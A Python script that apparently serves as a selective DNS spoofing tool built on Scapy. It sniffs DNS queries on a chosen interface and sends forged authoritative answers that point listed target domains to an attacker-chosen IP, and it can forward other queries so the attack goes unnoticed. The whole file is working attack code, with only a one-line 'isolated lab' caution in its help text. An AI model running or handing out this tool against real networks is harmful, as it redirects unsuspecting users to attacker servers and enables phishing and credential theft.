import argparse
import socket
from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR, conf

def load_domains(path):
    targets = set()
    with open(path, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            targets.add(line.lower().rstrip('.'))
    return targets

def craft_response(pkt, spoof_ip):
    qname = pkt[DNSQR].qname
    ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    udp = UDP(dport=pkt[UDP].sport, sport=53)
    dns = DNS(id=pkt[DNS].id, qr=1, aa=1, rd=pkt[DNS].rd, ra=1, qd=pkt[DNS].qd, an=DNSRR(rrname=qname, ttl=60, rdata=spoof_ip))
    return ip/udp/dns

def forward_query(pkt, real_dns):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2.0)
    try:
        s.sendto(bytes(pkt[UDP].payload), real_dns)
        data, _ = s.recvfrom(4096)
        return data
    except Exception:
        return None
    finally:
        s.close()

def main():
    ap = argparse.ArgumentParser(description='Selective DNS spoof (Scapy). Use only in isolated lab.')
    ap.add_argument('--iface', required=True, help='Interface to sniff (e.g., eth0)')
    ap.add_argument('--spoof-ip', required=True, help='IP address to return for target domains (e.g., attacker web)')
    ap.add_argument('--targets', required=True, help='File with target domains (one per line)')
    ap.add_argument('--dns-forward', help='Optional real DNS to forward non-target queries, e.g., 192.168.56.1')
    ap.add_argument('--verbose', action='store_true', help='Verbose output')
    args = ap.parse_args()

    conf.iface = args.iface
    targets = load_domains(args.targets)
    real_dns = (args.dns_forward, 53) if args.dns_forward else None

    def handler(pkt):
        if not (pkt.haslayer(DNSQR) and pkt[UDP].dport == 53):
            return
        qname = pkt[DNSQR].qname.decode().rstrip('.').lower()
        if args.verbose:
            print(f'[DNS] {pkt[IP].src} -> query for {qname}')
        if qname in targets:
            resp = craft_response(pkt, args.spoof_ip)
            send(resp, verbose=False)
            if args.verbose:
                print(f'[+] Spoofed {qname} -> {args.spoof_ip}')
        else:
            if real_dns:
                data = forward_query(pkt, real_dns)
                if data:
                    ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                    udp = UDP(dport=pkt[UDP].sport, sport=53)
                    send(ip/udp/data, verbose=False)
                    if args.verbose:
                        print(f'[.] Forwarded legit response for {qname}')
            else:
                if args.verbose:
                    print(f'[-] Ignoring non-target {qname} (no forward)')

    print('[*] Sniffing DNS on UDP/53... Ctrl+C to stop.')
    sniff(filter='udp port 53', prn=handler, store=False, iface=args.iface)

if __name__ == '__main__':
    main()
